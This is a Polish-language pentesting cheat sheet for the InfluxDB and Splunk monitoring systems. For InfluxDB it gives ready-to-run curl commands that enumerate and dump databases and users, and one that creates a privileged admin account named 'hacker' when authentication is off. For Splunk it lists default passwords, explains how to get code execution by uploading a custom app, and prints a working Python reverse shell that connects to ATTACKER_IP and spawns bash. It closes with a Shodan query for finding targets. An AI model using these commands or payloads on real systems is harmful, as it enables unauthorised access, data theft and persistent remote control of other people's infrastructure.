# InfluxDB i Splunk -- Pentesting Systemow Monitoringu

## 1. InfluxDB (port 8086)

### Identyfikacja wersji
```bash
# v1.x
curl -i http://<HOST>:8086/ping
# Naglowki: X-Influxdb-Version, X-Influxdb-Build

# v2.x
curl -s http://<HOST>:8086/health | jq .

# Metryki Prometheus (czesto otwarte)
curl -s http://<HOST>:8086/metrics
```

### Domyslne dane / brak autentykacji
- **InfluxDB czesto NIE wymaga autentykacji** -- dostep do HTTP API bez hasel
- **CVE-2019-20933** -- obejscie autentykacji (starsze wersje v1.x)
- **CVE-2024-30896** -- wyciek operator tokena w InfluxDB 2.x (do 2.7.11) -- uzytkownik z read auth w default org moze odczytac operator token

### Enumeracja przez HTTP API (v1 -- InfluxQL)
```bash
# Lista baz danych (bez auth!)
curl -sG "http://<HOST>:8086/query" --data-urlencode "q=SHOW DATABASES"

# Lista uzytkownikow
curl -sG "http://<HOST>:8086/query" --data-urlencode "q=SHOW USERS"

# Lista pomiarow (tabel)
curl -sG "http://<HOST>:8086/query" --data-urlencode "db=<DB>" --data-urlencode "q=SHOW MEASUREMENTS"

# Dump danych
curl -sG "http://<HOST>:8086/query" \
  --data-urlencode "db=<DB>" \
  --data-urlencode 'q=SELECT * FROM "<measurement>" LIMIT 100' | jq .

# ESKALACJA: Tworzenie admina (jesli auth wylaczony!)
curl -sG "http://<HOST>:8086/query" \
  --data-urlencode "q=CREATE USER hacker WITH PASSWORD 'P@ssw0rd!' WITH ALL PRIVILEGES"
```

### Enumeracja v2.x (token-based)
```bash
TOKEN="<token>"
# Lista organizacji
curl -s -H "Authorization: Token $TOKEN" http://<HOST>:8086/api/v2/organizations | jq .
# Lista bucketow
curl -s -H "Authorization: Token $TOKEN" 'http://<HOST>:8086/api/v2/buckets?limit=100' | jq .
# Lista autoryzacji (moze ujawnic operator token!)
curl -s -H "Authorization: Token $TOKEN" "http://<HOST>:8086/api/v2/authorizations" | jq .
```

---

## 2. Splunk (porty 8000/8089)

### Domyslne dane logowania
- **Starsze wersje**: `admin:changeme`
- **Nowsze**: haslo ustawiane przy instalacji (czeste slabe hasla: `admin`, `Welcome`, `Password123`)
- **Wersja darmowa (Free)**: po 60-dniowym trialu **autentykacja jest calkowicie wylaczona!**

### Interfejs webowy i wektory RCE
- Panel webowy na porcie **8000**, API Splunkd na **8089**
- **RCE przez Custom Application**:
  1. Stworz pakiet aplikacji ze skryptem reverse shell (Python/Bash/PowerShell)
  2. Struktura:
     ```
     splunk_shell/
     ├── bin/        (skrypt reverse shell)
     └── default/    (inputs.conf: disabled=0, interval=10)
     ```
  3. Wgraj przez interfejs Splunka -> automatyczne wykonanie
- **Przykladowy reverse shell (Python)**:
  ```python
  import sys, socket, os, pty
  s = socket.socket()
  s.connect(("ATTACKER_IP", 443))
  [os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
  pty.spawn('/bin/bash')
  ```
- **Splunk ma wbudowanego Pythona** -- dziala nawet na Windows

### Shodan
- `Splunk build`
